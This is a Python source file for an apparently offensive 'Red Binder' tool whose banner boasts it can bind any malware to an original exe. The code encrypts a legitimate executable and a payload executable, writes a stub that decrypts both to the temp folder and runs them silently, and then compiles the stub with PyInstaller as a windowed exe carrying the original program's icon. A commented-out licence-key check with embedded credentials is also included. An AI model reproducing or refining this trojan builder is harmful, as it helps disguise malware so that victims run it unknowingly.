from cryptography.fernet import Fernet
from colorama import Fore, Back, Style
from colorama import init
init(autoreset=True)
import os , shutil
import subprocess
from cryptography import *


if os.path.exists('fin.txt'):
    os.remove('fin.txt')
if os.path.exists('build'):
    shutil.rmtree('build')
if os.path.exists('p.txt'):
    os.remove('p.txt')
if os.path.exists('v.txt'):
    os.remove('v.txt')
if os.path.exists('k.txt'):
    os.remove('k.txt')    
if os.path.exists('__pycache__'):
    shutil.rmtree('__pycache__')
if os.path.exists('f.py'):
    os.remove('f.py')
if os.path.exists('f.spec'):
    os.remove('f.spec')
if os.path.exists('ap.ico'):
    os.remove('ap.ico')

"""

    Auth Bypass 

from licensing.models import *
from licensing.methods import Key, Helpers


RSAPubKey = "<RSAKeyValue><Modulus>hFH+Q5RWfoq+vDP4m5PGL47SkzjGNyWyJcwImuSatydMsIwwkrOLiiTTdNVtV4nvvdDVYwFhFvkR+ZuiAFp3hRmjGy79OP5hWo1jMT3aHz8C68yfQgrjRqxPYY224yQW+fVxyX9c02iWD7yeDmLilafSpZtPoR/6kD5X8OnhHExYQZPHSIrutw8GVE0nAwYIEuN47toxyqOELDoF8X/hcF0mr/vbrId2Rqv9rfaY4JrvMJXyqrJM4rZrpYPsLKDlW3fNMoa28GHnxLVNENujs2F74E4ccubVXi5ciUgTXXkS+B72ATmY3HRxwD0SBvuERuFsQD8ssgYL23RXACwVGw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
auth = "WyIzMzAzMTc3IiwidVpJME1xalRPMzR1LzV6SGtyT1hZMVJ3V3J5eXNOcjltaGNUZmpRbSJd"

def AuthKey():
    
    print(Style.BRIGHT + Fore.YELLOW + "Enter your Authentication Key ")
    key = str(input(">>>  "))
    result = Key.activate(token=auth,
    rsa_pub_key=RSAPubKey,
    product_id=12082,
    key=key,
    machine_code=Helpers.GetMachineCode())


    if result[0] == None:
        print(Style.BRIGHT + Fore.RED + "ERROR: {0}".format(result[1]))

        help = input("Need Help : Y /n  "  )
        if help == "Y" or help == "y":
            print("Contact Admin @david_3illa")
            print("")
        elif help != "n" or "N":
            print("Quit")
            time.sleep(2)
            sys.exit(0)
        return AuthKey() 
    else:
        print(Style.BRIGHT + Fore.GREEN + "Successfully Authenticated")
        time.sleep(1.5)
        print("")
        print(Style.BRIGHT + Fore.GREEN + "Welcome to Red Tools")
        time.sleep(2)

AuthKey()

"""

import sys
import time

def typing(l):
    for letter in l:
        print(Style.BRIGHT + Fore.RED + letter, end='', flush=True)
#        sys.stdout.flush()
        time.sleep(.16)

def loop():
    line = ( Style.BRIGHT + Fore.YELLOW + 'We are the Mastering of Dark Code. Our Red Binder , can Bind any Malware with Original Exe File')

    print(line)
    print('')
    line =  'Created by @david_3illa'
    typing(line)
    print('')

loop()

print("")
print("")
print(Style.BRIGHT + Fore.GREEN + "Enter Original Exe")
exe1 = input("=> ")
print("")

print(Style.BRIGHT + Fore.RED + "Enter Payload Exe ")
exe2 = input("=> ")
print("")
if sys.platform == "win32":
	scl = f'cmd /c "icoextract {exe1} ap.ico "'
else:
	scl = f'icoextract {exe1} ap.ico'

subprocess.run(scl , shell = True , stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

key = Fernet.generate_key()

with open('k.txt', 'wb') as filekey:
   filekey.write(key)

with open('k.txt', 'rb') as filekey:
    key = filekey.read()

fernet = Fernet(key)

with open(exe1, 'rb') as file:
    original = file.read()

encrypted = fernet.encrypt(original)
    
with open('p.txt', 'wb') as encrypted_file:
    encrypted_file.write(encrypted)

with open(exe2, 'rb') as file:
    original = file.read()
    
encrypted = fernet.encrypt(original)

with open('v.txt', 'wb') as encrypted_file:
    encrypted_file.write(encrypted)

    
a = 'fw1 = b" '
b = 'fw2 = b" '

with open('p.txt','r') as firstfile, open('fin.txt','a') as secondfile:

    for line in firstfile:
        secondfile.write(a +line + ' "')

with open ("fin.txt" , "a") as e:
    e.writelines("\n" + "\n" + "\n" + "\n" + "\n" + "\n")

with open('v.txt','r') as firstfile, open('fin.txt','a') as secondfile:

    for line in firstfile:
        secondfile.write(b + line + ' "')

with open ("fin.txt" , "a") as e:
    e.writelines("\n" + "\n" + "\n" )

with open('k.txt','r') as firstfile, open('fin.txt','a') as secondfile:

    for line in firstfile:
        secondfile.write('key = "' + line + '"')

with open ("fin.txt" , "a") as e:
    e.writelines("\n" + "\n" + "\n" )
    
proc = """

ase = fw1

awe = fw2



from cryptography.fernet import Fernet
import subprocess , os
import tempfile
    
fernet = Fernet(key)

encrypted1 = ase
  
decrypted1 = fernet.decrypt(encrypted1)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

if os.path.exists('temp.exe'):
    os.remove('temp.exe')

    
with open('temp.exe', 'wb') as dec_file:
    dec_file.write(decrypted1)
    
subprocess.Popen('temp.exe' , shell =True)

encrypted2 = awe
  
decrypted2 = fernet.decrypt(encrypted2)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)


if os.path.exists('tmp.exe'):
    os.remove('tmp.exe')

    
with open('tmp.exe', 'wb') as dec_file:
    dec_file.write(decrypted2)
    
subprocess.Popen('tmp.exe' , shell =True)
"""

with open ("fin.txt" , "a") as e:
    e.writelines(proc)

import os, subprocess , sys , shutil , time

os.rename("fin.txt" , "f.py")

if os.path.exists('p.txt'):
    os.remove('p.txt')
if os.path.exists('v.txt'):
    os.remove('v.txt')
if os.path.exists('k.txt'):
    os.remove('k.txt')


#subprocess.call('cmd /c "pyinstaller f.py --onefile --windowed"' , shell = True , stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#os.system('cmd /c "pyinstaller f.py --onefile --windowed"')
#subprocess.call('cmd /c "pyinstaller f.py --onefile --windowed"' , shell = True)
#os.system('cmd /c "pyinstaller f.py --onefile "')
#subprocess.run('cmd /c "pyinstaller f.py --onefile "' , shell = True)

print(Style.BRIGHT + Fore.CYAN + "Please Wait 30 Sec..While Exe Binding...")
print("")
if sys.platform == 'win32':
	subprocess.run('cmd /c "pyinstaller f.py --onefile --windowed --icon=ap.ico "' , shell = True , stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
else:
	subprocess.run('pyinstaller f.py --onefile --windowed --icon=ap.ico' , shell = True , stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


time.sleep(1)


#if os.path.exists('f.py'):
#    os.remove('f.py')
#if os.path.exists('f.spec'):
#    os.remove('f.spec')
#if os.path.exists('ap.ico'):
#    os.remove('ap.ico')
#time.sleep(1)

#if os.path.exists('build'):
#    shutil.rmtree('build')
    
if os.path.exists('__pycache__'):
    shutil.rmtree('__pycache__')

os.chdir('dist')

print(Style.BRIGHT + Fore.YELLOW + "Enter Filename to save EXE ")
sv = input("=> ")
os.rename("f.exe" , sv)
print("")


print(Style.BRIGHT + Fore.BLUE + "Binded " + sv + " Exe are saved in dist folder")
print("")
print("")

print(Style.BRIGHT + Fore.RED + "Press Enter to Exit")
er = input()

